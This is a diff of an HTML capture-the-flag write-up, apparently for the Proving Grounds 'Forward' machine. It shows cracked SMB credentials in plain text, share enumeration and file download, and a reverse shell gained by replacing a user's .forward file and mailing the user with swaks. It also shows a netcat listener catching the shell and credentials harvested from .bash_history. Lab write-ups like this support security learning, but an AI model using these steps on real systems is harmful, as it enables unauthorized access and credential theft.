@@ -137,6 +137,8 @@ Decrypted password is :  iparalipomenidellabatracomiomachia
     </pre>
 
     <li>I did the above for each .reg file and ended up with:</li>
+
+    <br>
     
     <pre>
 fox:iparalipomenidellabatracomiomachia
@@ -149,11 +151,15 @@ vale:cocomerirossi
 
     <li>Then I used each user:pass combo to login to the SMB server again.</li>
 
+    <br>
+
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward/Exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ smbmap -H 192.168.90.157 -u fox -p iparalipomenidellabatracomiomachia                                                                               130 &Cross;&#13;&#10;[+] IP: 192.168.90.157:445&#9;Name: 192.168.90.157                                    &#13;&#10;        Disk                                                  &#9;Permissions&#9;Comment&#13;&#10;&#9;----                                                  &#9;-----------&#9;-------&#13;&#10;&#9;utils                                             &#9;READ ONLY&#9;Utilities&#13;&#10;&#9;print$                                            &#9;READ ONLY&#9;Printer Drivers&#13;&#10;&#9;IPC$                                              &#9;NO ACCESS&#9;IPC Service (Samba 4.9.5-Debian)&#13;&#10;&#9;fox                                               &#9;READ, WRITE&#9;Home Directories
     </pre>
 
     <li>Fox is the only one with SMB access.  I take a look at the share "fox" and download all the contents.</li>
+
+    <br>
 
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/&mldr;/ProvingGrounds/Forward/Exfiltrated/fox]&#13;&#10;&boxur;&HorizontalLine;$ smbclient //192.168.90.157/fox -U fox iparalipomenidellabatracomiomachia&#13;&#10;Try &quot;help&quot; to get a list of possible commands.&#13;&#10;smb: \&gt; ls&#13;&#10;  .                                   D        0  Fri Oct  1 19:58:11 2021&#13;&#10;  ..                                  D        0  Fri Jan  8 13:04:11 2021&#13;&#10;  .bashrc                             H     3526  Fri Dec 18 02:48:44 2020&#13;&#10;  .Xauthority                         H       53  Mon Aug  9 17:55:45 2021&#13;&#10;  .bash_history                       H        0  Tue Aug 24 11:49:26 2021&#13;&#10;  .profile                            H      807  Fri Dec 18 02:48:44 2020&#13;&#10;  local.txt                           N       33  Fri Oct  1 19:40:15 2021&#13;&#10;  .local                             DH        0  Tue Aug 24 06:20:56 2021&#13;&#10;  .dosbox                            DH        0  Mon Aug  9 17:55:54 2021&#13;&#10;  .bash_logout                        H      220  Fri Dec 18 02:48:44 2020&#13;&#10;  .gnupg                             DH        0  Mon Aug  9 17:40:39 2021&#13;&#10;  .forward                           AH       25  Tue Aug 24 06:23:05 2021&#13;&#10;&#13;&#10;&#9;&#9;14384136 blocks of size 1024. 11598184 blocks available&#13;&#10;smb: \&gt; prompt off&#13;&#10;smb: \&gt; mget *&#13;&#10;getting file \.bashrc of size 3526 as .bashrc (20.4 KiloBytes/sec) (average 20.4 KiloBytes/sec)&#13;&#10;getting file \.Xauthority of size 53 as .Xauthority (0.3 KiloBytes/sec) (average 10.7 KiloBytes/sec)&#13;&#10;NT_STATUS_ACCESS_DENIED opening remote file \.bash_history&#13;&#10;getting file \.profile of size 807 as .profile (5.2 KiloBytes/sec) (average 9.0 KiloBytes/sec)&#13;&#10;getting file \local.txt of size 33 as local.txt (0.2 KiloBytes/sec) (average 6.8 KiloBytes/sec)&#13;&#10;getting file \.bash_logout of size 220 as .bash_logout (1.5 KiloBytes/sec) (average 5.8 KiloBytes/sec)&#13;&#10;getting file \.forward of size 25 as .forward (0.2 KiloBytes/sec) (average 4.9 KiloBytes/sec)
@@ -163,6 +169,8 @@ vale:cocomerirossi
     <h2><a id="fox">Shell - fox</a></h2>
 
     <li>After doing some googling around I find out that when a user gets emailed, it gets passed through the .forward file in their home directory.  So if we are able to change the contents of the .forward file and send the user and email, then we can get RCE.  Port 25 is also open on this box so sending an email to the user should be no problem.  First I create a .forward file that will give us a reverse shell.  Then I delete the .forward file from the SMB share and upload my own.</li>
+
+    <br>
 
     <pre>
 ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Forward]
@@ -194,11 +202,15 @@ putting file .forward as \.forward (0.3 kb/s) (average 0.3 kb/s)
 
     <li>Now that the .forward file has been replaced with my own, I start a netcat listener on port 4444 and then send an email to the user fox using the tool swaks.</li>
 
+    <br>
+
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward/Exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ swaks --to fox@forward --server 192.168.90.157&#13;&#10;=== Trying 192.168.90.157:25...&#13;&#10;=== Connected to 192.168.90.157.&#13;&#10;&lt;-  220 forward ESMTP Exim 4.92 Fri, 01 Oct 2021 20:06:52 -0400&#13;&#10; -&gt; EHLO kali&#13;&#10;&lt;-  250-forward Hello kali [192.168.49.90]&#13;&#10;&lt;-  250-SIZE 52428800&#13;&#10;&lt;-  250-8BITMIME&#13;&#10;&lt;-  250-PIPELINING&#13;&#10;&lt;-  250-CHUNKING&#13;&#10;&lt;-  250-PRDR&#13;&#10;&lt;-  250 HELP&#13;&#10; -&gt; MAIL FROM:&lt;kali@kali&gt;&#13;&#10;&lt;-  250 OK&#13;&#10; -&gt; RCPT TO:&lt;fox@forward&gt;&#13;&#10;&lt;-  250 Accepted&#13;&#10; -&gt; DATA&#13;&#10;&lt;-  354 Enter message, ending with &quot;.&quot; on a line by itself&#13;&#10; -&gt; Date: Fri, 01 Oct 2021 20:06:41 -0400&#13;&#10; -&gt; To: fox@forward&#13;&#10; -&gt; From: kali@kali&#13;&#10; -&gt; Subject: test Fri, 01 Oct 2021 20:06:41 -0400&#13;&#10; -&gt; Message-Id: &lt;20211001200641.007900@kali&gt;&#13;&#10; -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/&#13;&#10; -&gt; &#13;&#10; -&gt; This is a test mailing&#13;&#10; -&gt; &#13;&#10; -&gt; &#13;&#10; -&gt; .&#13;&#10;&lt;-  250 OK id=1mWSYG-0000Hp-DA&#13;&#10; -&gt; QUIT&#13;&#10;&lt;-  221 forward closing connection&#13;&#10;=== Connection closed with remote host.
     </pre>
 
     <li>Now I have a reverse shell.</li>
+
+    <br>
 
     <pre>
 &boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward]&#13;&#10;&boxur;&HorizontalLine;$ nc -lvnp 4444&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Listening on :::4444&#13;&#10;Ncat: Listening on 0.0.0.0:4444&#13;&#10;Ncat: Connection from 192.168.90.157.&#13;&#10;Ncat: Connection from 192.168.90.157:34368.&#13;&#10;id&#13;&#10;uid=1000(fox) gid=100(users) groups=100(users)&#13;&#10;python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;fox@forward:~$ export TERM=xterm&#13;&#10;export TERM=xterm&#13;&#10;fox@forward:~$ ^Z&#13;&#10;zsh: suspended  nc -lvnp 4444&#13;&#10;                                                                                                                                                              &#13;&#10;&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/ProvingGrounds/Forward]&#13;&#10;&boxur;&HorizontalLine;$ stty raw -echo;fg;                                                                                                                              148 &Cross; 1 &#9881;&#13;&#10;[1]  + continued  nc -lvnp 4444&#13;&#10;&#13;&#10;fox@forward:~$ 
@@ -210,7 +222,7 @@ putting file .forward as \.forward (0.3 kb/s) (average 0.3 kb/s)
     <li>After looking in each user's home directory I find a .bash_history file that contains credentials.</li>
 
     <br>
-    
+
     <pre>
 fox@forward:/home/mara$ cat .bash_history 
 sshh mara@192.168.0.191
